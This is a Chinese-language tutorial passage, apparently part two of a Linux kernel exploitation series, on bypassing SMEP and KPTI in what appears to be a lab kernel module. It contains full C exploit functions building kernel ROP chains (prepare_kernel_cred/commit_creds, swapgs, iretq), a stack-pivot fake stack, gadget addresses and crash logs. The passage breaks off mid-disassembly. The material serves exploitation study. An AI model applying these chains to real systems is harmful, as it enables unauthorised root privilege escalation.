@@ -1,0 +1,332 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<p>在Part 1部分我们关闭了所有的保护方式，包括<code>SMEP</code>、<code>KPTI</code>、<code>SMAP</code>，</p>
+<p>本章节会逐个的开启这些保护方式，并探讨如果绕过这些机制。</p>
+<h4 data-content="1" id="7e1a27ae40c2ab3334cf7447804e5421">Bypass SMEP</h4>
+<p>在Part1中，用于覆盖返回地址的函数<code>escalate_privs</code>存在userspace中，当开启SMEP时，在kernel-mode下，userspace地址被标记为<code>non-executable</code>。这一点很像userland下的<code>NX</code>保护，同样的，在userland下我们使用<code>ROP</code>，在kernelland下，有<code>Kernel ROP</code>.</p>
+<p>值得注意的是，<code>get_shell</code>是在由kernel-mode去换到user-mode之后完成的，因此不会受到SMEP的影响，不需要ROPchain。</p>
+<h5 data-content="1" id="ec25b781164e89c8dee349490aa0c16d">Try To Overwrite CR4</h5>
+<p>在Part 1中提到，SMEP由CR4寄存器的20th bit控制，而在kernel-mode下，我们可以修改CR4寄存器的值，例如<code>mov cr4, rax</code>；有一个通用的函数<code>native_write_cr4(value)</code>可以修改CR4的值为指定的value，该函数同样在kernel地址空间中</p>
+<pre><code>/ # cat /proc/kallsyms | grep native_write_cr4
+ffffffff814443e0 T native_write_cr4</code></pre>
+<p>通过<code>ROP</code>构造上述函数执行，实现修改CR4寄存器。</p>
+<p>通过<code>ROPgadget --binary vmlunix &gt; gadgets.txt</code>获取所有的gadget，从中找到<code>pop rdi, ret</code>。</p>
+<p>通过调试kernel或者触发崩溃可以得到正常情况下的CR4值，20th bit对应的值是<code>0x100000</code>。</p>
+<pre><code>[   10.349798] CR2: ffff88800686a200 CR3: 000000000655c000 CR4: 00000000001006f0
+&gt;&gt;&gt; hex(1&lt;&lt;20)
+'0x100000'</code></pre>
+<p>当20th bit清零后，CR4值为<code>0x6f0</code>；下面的代码即可以修改CR4</p>
+<div class="highlight"><pre><span></span><span class="kt">void</span> <span class="nf">exploit</span><span class="p">()</span>
+<span class="p">{</span>   
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="mh">0xffffffff81006370</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">native_write_cr4</span> <span class="o">=</span> <span class="mh">0xffffffff814443e0</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">payload</span><span class="p">[</span><span class="mh">0x100</span><span class="o">/</span><span class="mi">8</span><span class="p">];</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">offset</span> <span class="o">=</span> <span class="mh">0x80</span><span class="o">/</span><span class="mi">8</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">cookie</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">pop_rdi_ret</span><span class="p">;</span>
+
+    <span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x6f0</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">native_write_cr4</span><span class="p">;</span>
+
+    <span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">escalate_privs</span><span class="p">;</span>
+
+    <span class="n">puts</span><span class="p">(</span><span class="s">"[*] Prepared payload"</span><span class="p">);</span>
+    <span class="kt">size_t</span> <span class="n">size</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">global_fd</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">));</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"[!] Should never be reached"</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+<p>但是实际上，失败了，kernel崩溃了，panic输出</p>
+<pre><code>[*] Prepared payload
+[   19.393575] unable to execute userspace code (SMEP?) (uid: 1000)
+...
+[   19.404200] CR2: 0000000000401102 CR3: 0000000006508000 CR4: 00000000001006f0</code></pre>
+<p>发现CR4的值没有改动，SMEP仍然处于<code>enable</code>状态。</p>
+<h5 data-content="1" id="79ece09e55002786bc4a270f26849532">Escalation ROPchain</h5>
+<p>既然无法改写CR4禁用SMEP，就只好通过ROP的方式完成<code>escalate_priv</code>。</p>
+<ul>
+<li>ROP 构造  <code>prepare_kernel_cred(0)</code>
+</li>
+<li>ROP 构造 <code>commit_creds()</code>，以上一步的返回值为参数</li>
+<li>ROP 构造  <code>swapgs; ret</code>
+</li>
+<li>ROP 构造 stack setup, <code>RIP|CS|RFLAGS|SP|SS</code>
+</li>
+<li>ROP 构造 <code>iretq</code>
+</li>
+</ul>
+<p>在导出的gadgets.txt搜索到下面的代码片段，可以完成前三个步骤的ROPchain</p>
+<pre><code>0xffffffff81006370 : pop rdi ; ret          // 传递函数第一个参数
+
+0xffffffff81007616 : pop rdx ; ret          // 设置rdx
+0xffffffff81c0f8b2 : cmp rdx, -1 ; jne 0xffffffff81c0f8a7 ; ret             // rdx等于-1 不会跳转
+0xffffffff8166ff23 : mov rdi, rax ; jne 0xffffffff8166fef3 ; pop rbx ; pop rbp ; ret  // 受上述cmp rdx -1影响不会跳转
+
+0xffffffff8100a55f : swapgs ; pop rbp ; ret     // swapgs</code></pre>
+<p>但是在gadgets.txt里没有找到<code>iretq</code>指令，objdump可以发现</p>
+<pre><code>$ objdump -j .text -d ./vmlinux  | grep iretq | head -3
+ffffffff8100c0d9:   48 cf                   iretq  
+ffffffff81200fc7:   48 cf                   iretq  
+ffffffff81201485:   48 cf                   iretq</code></pre>
+<p>构造下面的exploit函数</p>
+<div class="highlight"><pre><span></span><span class="kt">void</span> <span class="nf">exploit_smep</span><span class="p">()</span>
+<span class="p">{</span>   
+
+
+    <span class="n">user_rip</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">get_root_shell</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">prepare_kernel_cred</span> <span class="o">=</span> <span class="mh">0xffffffff814c67f0</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">commit_creds</span> <span class="o">=</span> <span class="mh">0xffffffff814c6410</span><span class="p">;</span>
+
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="mh">0xffffffff81006370</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">pop_rdx_ret</span> <span class="o">=</span> <span class="mh">0xffffffff81007616</span><span class="p">;</span>             <span class="c1">// pop rdx ; ret</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">cmp_rdx_jne_ret</span> <span class="o">=</span> <span class="mh">0xffffffff81c0f8b2</span><span class="p">;</span>         <span class="c1">// cmp rdx, -1 ; jne 0xffffffff81c0f8a7 ; ret</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">cmp_rdx_jne_pop2_ret</span> <span class="o">=</span> <span class="mh">0xffffffff81964cc4</span><span class="p">;</span>    <span class="c1">//  cmp rdx, 8 ; jne 0xffffffff81964cb3 ; pop rbx ; pop rbp ; ret</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">mov_rdi_rax_pop2_ret</span> <span class="o">=</span> <span class="mh">0xffffffff8166ff23</span><span class="p">;</span>    <span class="c1">// mov rdi, rax ; jne 0xffffffff8166fef3 ; pop rbx ; pop rbp ; ret</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">swapgs_pop1_ret</span> <span class="o">=</span> <span class="mh">0xffffffff8100a55f</span><span class="p">;</span>         <span class="c1">// swapgs ; pop rbp ; ret</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">iretq</span> <span class="o">=</span> <span class="mh">0xffffffff8100c0d9</span><span class="p">;</span>
+
+
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">payload</span><span class="p">[</span><span class="mi">60</span><span class="p">];</span>                                  <span class="c1">// 该值太大会覆盖其他栈帧内的cookie造成stack guard终止</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">offset</span> <span class="o">=</span> <span class="mh">0x80</span><span class="o">/</span><span class="mi">8</span><span class="p">;</span>
+
+
+    <span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">cookie</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>
+
+    <span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">pop_rdi_ret</span><span class="p">;</span>
+
+
+    <span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x00</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">prepare_kernel_cred</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">pop_rdx_ret</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">8</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">cmp_rdx_jne_pop2_ret</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">mov_rdi_rax_pop2_ret</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">commit_creds</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">swapgs_pop1_ret</span><span class="p">;</span>    <span class="c1">// swapgs ; pop rbp ; ret   </span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>                <span class="c1">// </span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">iretq</span><span class="p">;</span>              <span class="c1">// iretq        </span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_rip</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_cs</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_rflags</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_sp</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_ss</span><span class="p">;</span>
+
+
+    <span class="n">puts</span><span class="p">(</span><span class="s">"[*] Prepared payload"</span><span class="p">);</span>
+    <span class="kt">size_t</span> <span class="n">size</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">global_fd</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">));</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"[!] Should never be reached"</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+<h5 data-content="1" id="86292bd262751ec3e923bf0410fd7356">stack pivoting</h5>
+<p>在userland的漏洞利用中，如果栈溢出长度只能够覆盖到返回地址而无法完全构造整个ROPchain时，一个有效的构造手段就是<code>stack pivot</code>，需要修改<code>rsp</code>到可控的地址（提前布置一个fake stack）。</p>
+<p>在userland中，并需要修改保存的<code>rbp</code>，通过<code>leave</code>类的指令间接地修改<code>rsp</code>。</p>
+<p>在kernel-mode下，该方法实现更容易，因为有大量的gadget可以使用。最常用的就是可以直接修改<code>rsp/esp</code>的指令，只要保证值是页对齐的就合适。例如：</p>
+<pre><code>0xffffffff8196f56a : mov esp, 0x5b000000 ; pop r12 ; pop rbp ; ret</code></pre>
+<p>由于<code>esp</code>将变为<code>0x5b000000</code>，我们可以在该地址映射可执行的page，提前写入ROPchain，溢出时只需要覆盖返回地址即可执行ROPchain。</p>
+<div class="highlight"><pre><span></span><span class="kt">void</span> <span class="nf">stack_pivot</span><span class="p">()</span>
+<span class="p">{</span>
+
+    <span class="n">user_rip</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">get_root_shell</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">prepare_kernel_cred</span> <span class="o">=</span> <span class="mh">0xffffffff814c67f0</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">commit_creds</span> <span class="o">=</span> <span class="mh">0xffffffff814c6410</span><span class="p">;</span>
+
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="mh">0xffffffff81006370</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">pop_rdx_ret</span> <span class="o">=</span> <span class="mh">0xffffffff81007616</span><span class="p">;</span>             <span class="c1">// pop rdx ; ret</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">cmp_rdx_jne_ret</span> <span class="o">=</span> <span class="mh">0xffffffff81c0f8b2</span><span class="p">;</span>         <span class="c1">// cmp rdx, -1 ; jne 0xffffffff81c0f8a7 ; ret</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">cmp_rdx_jne_pop2_ret</span> <span class="o">=</span> <span class="mh">0xffffffff81964cc4</span><span class="p">;</span>    <span class="c1">//  cmp rdx, 8 ; jne 0xffffffff81964cb3 ; pop rbx ; pop rbp ; ret</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">mov_rdi_rax_pop2_ret</span> <span class="o">=</span> <span class="mh">0xffffffff8166ff23</span><span class="p">;</span>    <span class="c1">// mov rdi, rax ; jne 0xffffffff8166fef3 ; pop rbx ; pop rbp ; ret</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">swapgs_pop1_ret</span> <span class="o">=</span> <span class="mh">0xffffffff8100a55f</span><span class="p">;</span>         <span class="c1">// swapgs ; pop rbp ; ret</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">iretq</span> <span class="o">=</span> <span class="mh">0xffffffff8100c0d9</span><span class="p">;</span>
+
+
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">fake_stack</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)(</span><span class="mh">0x5b000000</span> <span class="o">-</span> <span class="mh">0x1000</span><span class="p">),</span> <span class="mh">0x2000</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_WRITE</span><span class="o">|</span><span class="n">PROT_EXEC</span><span class="p">,</span>
+                                        <span class="n">MAP_ANONYMOUS</span><span class="o">|</span><span class="n">MAP_PRIVATE</span><span class="o">|</span><span class="n">MAP_FIXED</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="kt">unsigned</span> <span class="n">offset</span> <span class="o">=</span> <span class="mh">0x1000</span> <span class="o">/</span> <span class="mi">8</span><span class="p">;</span>       <span class="c1">// ROPchain in second page</span>
+    <span class="n">fake_stack</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xdead</span><span class="p">;</span>             <span class="c1">// write first page to prevent fault</span>
+    <span class="n">fake_stack</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>         <span class="c1">// r12</span>
+    <span class="n">fake_stack</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>         <span class="c1">// rbp</span>
+
+    <span class="n">fake_stack</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">pop_rdi_ret</span><span class="p">;</span>
+
+    <span class="n">fake_stack</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x00</span><span class="p">;</span>
+    <span class="n">fake_stack</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">prepare_kernel_cred</span><span class="p">;</span>
+    <span class="n">fake_stack</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">pop_rdx_ret</span><span class="p">;</span>
+    <span class="n">fake_stack</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">8</span><span class="p">;</span>
+    <span class="n">fake_stack</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">cmp_rdx_jne_pop2_ret</span><span class="p">;</span>
+    <span class="n">fake_stack</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">fake_stack</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">fake_stack</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">mov_rdi_rax_pop2_ret</span><span class="p">;</span>
+    <span class="n">fake_stack</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>
+    <span class="n">fake_stack</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>
+    <span class="n">fake_stack</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">commit_creds</span><span class="p">;</span>
+    <span class="n">fake_stack</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">swapgs_pop1_ret</span><span class="p">;</span>     <span class="c1">// swapgs ; pop rbp ; ret   </span>
+    <span class="n">fake_stack</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>             <span class="c1">// </span>
+    <span class="n">fake_stack</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">iretq</span><span class="p">;</span>               <span class="c1">// iretq        </span>
+    <span class="n">fake_stack</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_rip</span><span class="p">;</span>
+    <span class="n">fake_stack</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_cs</span><span class="p">;</span>
+    <span class="n">fake_stack</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_rflags</span><span class="p">;</span>
+    <span class="n">fake_stack</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_sp</span><span class="p">;</span>
+    <span class="n">fake_stack</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_ss</span><span class="p">;</span>
+
+
+
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">payload</span><span class="p">[</span><span class="mi">60</span><span class="p">];</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">off</span> <span class="o">=</span> <span class="mh">0x80</span><span class="o">/</span><span class="mi">8</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">cookie</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>                   <span class="c1">// only overwrite return address</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff8196f56a</span><span class="p">;</span>    <span class="c1">// mov esp, 0x5b000000 ; pop r12 ; pop rbp ; ret</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"[*] Prepared payload"</span><span class="p">);</span>
+    <span class="kt">size_t</span> <span class="n">size</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">global_fd</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">));</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"[!] Should never be reached"</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+<p>构造fake_stack时需要注意的几点</p>
+<ul>
+<li>
+<p>mmap两个pages，从<code>0x5b000000 - 0x1000</code>开始而不是<code>0x5b000000</code>，这是因为在fake_stack里执行的函数会导致栈生长，如果<code>esp</code>指向page的起始地址，可能导致fake_stack栈空间不足，异常结束。</p>
+</li>
+<li>
+<p>第一个空白页，我们需要写入一个dirty值，否则导致<code>Double Fault</code>，</p>
+<pre><code>[   44.010031] traps: PANIC: double fault, error_code: 0x0
+[   44.010827] double fault: 0000 [#1] SMP NOPTI</code></pre>
+<p>这是由于page在mapped之后并不会立即插入page table，而是在被写入之后。所以尽管ROPchain在第二个page，第一个page也需要一次写入。</p>
+</li>
+</ul>
+<h4 data-content="1" id="33550a0df67219d975293318985ecb4e">ByPass KPTI</h4>
+<h5 data-content="1" id="5cf6407bbba90f30107115e649b919ef">Page Table</h5>
+<p>每一个进程都有一个指向进程自身的页表，由CR3寄存器指定。</p>
+<h5 data-content="1" id="25634d5637e73bf6c333ed4abb18a410">KPTI</h5>
+<p>Kernel Page-table isolation，该机制引入kernel防止<code>meltdown</code>攻击，在userland没有类似的机制。</p>
+<p>如果没有KPTI，从kernel-mode切换到user-mode时，Linux会在其页表中保存整个内核内存的映射，这样做的优点是当应用程序向内核发送系统调用或者接收到中断时，内核页表始终存在，可以避免大多数上下文切换的开销。</p>
+<p>开启KPTI后，userland页表只有部分内核映射（用于中断入口出口），而避免了内核页表的泄漏。</p>
+<h5 data-content="1" id="f60750ab7780024438596a62f9317e1a">bypass</h5>
+<p>在开启KPTI的情况下，目前为止得到所有exploit都将造成<code>crash</code>，有趣的是该crash是在userland常见的<code>Segmentation fault</code>。</p>
+<pre><code>/ $ ./exploit 
+[*] Saved state
+[*] Opened device
+[*] Leak 160 bytes
+[*] Cookie: 0x6e0d7bffd02b0400
+[*] Prepared payload
+Segmentation fault</code></pre>
+<p>这是由于尽管回到了user-mode，page-tables依然是kernel-mode的（并没有主动交换页表），在<code>kernel-mode</code>下userland的pages是不可执行的。</p>
+<p>绕过KPTI的两种常见方法：</p>
+<ul>
+<li>
+<p>使用<code>signal handler</code>：这种方法很简单，机智。原理这个崩溃导致userland处理<code>SIGSEGV</code>信号，我们可以为它注册一个信号处理句柄，只需要在main函数中加上以下简单的语句</p>
+<div class="highlight"><pre><span></span><span class="n">signal</span><span class="p">(</span><span class="n">SIGSEGV</span><span class="p">,</span> <span class="n">get_root_shell</span><span class="p">);</span>
+</pre></div>
+<p>疑惑地是，即使作为<code>handler</code>，<code>get_root_shell</code>函数依然是在不可执行的页面上。</p>
+</li>
+<li>
+<p>KPTI trampoline：基于的理论是“如果一个syscall正常返回，那么内核中一定有一段代码会将page tables交换回userland，因此我们可以利用这段代码达到目的。这段代码称为<code>KPTI trampoline</code>，它的作用就是交换page tables, <code>swapgs</code>和<code>iretq</code>。</p>
+<p>这段代码所在的函数是<code>swapgs_restore_regs_and_return_to_usermode()</code>，在<code>/proc/kallsyms</code>中一样可以找到其地址。</p>
+<pre><code>/ # cat /proc/kallsyms | grep swapgs_restore_regs_and_return_to_usermode
+ffffffff81200f10 T swapgs_restore_regs_and_return_to_usermode</code></pre>
+<p>该函数的起始部分代码</p>
+<pre><code>.text:FFFFFFFF81200F10                 pop     r15
+.text:FFFFFFFF81200F12                 pop     r14
+.text:FFFFFFFF81200F14                 pop     r13
+.text:FFFFFFFF81200F16                 pop     r12
+.text:FFFFFFFF81200F18                 pop     rbp
+.text:FFFFFFFF81200F19                 pop     rbx
+.text:FFFFFFFF81200F1A                 pop     r11
+.text:FFFFFFFF81200F1C                 pop     r10
+.text:FFFFFFFF81200F1E                 pop     r9
+.text:FFFFFFFF81200F20                 pop     r8
+.text:FFFFFFFF81200F22                 pop     rax
+.text:FFFFFFFF81200F23                 pop     rcx
+.text:FFFFFFFF81200F24                 pop     rdx
+.text:FFFFFFFF81200F25                 pop     rsi
+.text:FFFFFFFF81200F26                 mov     rdi, rsp
+.text:FFFFFFFF81200F29                 mov     rsp, qword ptr gs:unk_6004
+.text:FFFFFFFF81200F32                 push    qword ptr [rdi+30h]
+.text:FFFFFFFF81200F35                 push    qword ptr [rdi+28h]
+.text:FFFFFFFF81200F38                 push    qword ptr [rdi+20h]
+.text:FFFFFFFF81200F3B                 push    qword ptr [rdi+18h]
+.text:FFFFFFFF81200F3E                 push    qword ptr [rdi+10h]
+.text:FFFFFFFF81200F41                 push    qword ptr [rdi]
+.text:FFFFFFFF81200F43                 push    rax
+.text:FFFFFFFF81200F44                 jmp     short loc_FFFFFFFF81200F89</code></pre>
+<p>通过<code>pop</code>从栈上恢复大量寄存器，这一部分会增加ROPchain的负载，因此我们这里的<code>kpti_trampoline</code>只从<code>pop</code>之后的第一条指令的位置，即<code>func+22</code>位置。</p>
+</li>
+</ul>
+<p>该函数里最关键的代码</p>
+<pre><code>.text:FFFFFFFF81200F89 loc_FFFFFFFF81200F89:                   ; CODE XREF: sub_FFFFFFFF812010D0-18C↑j
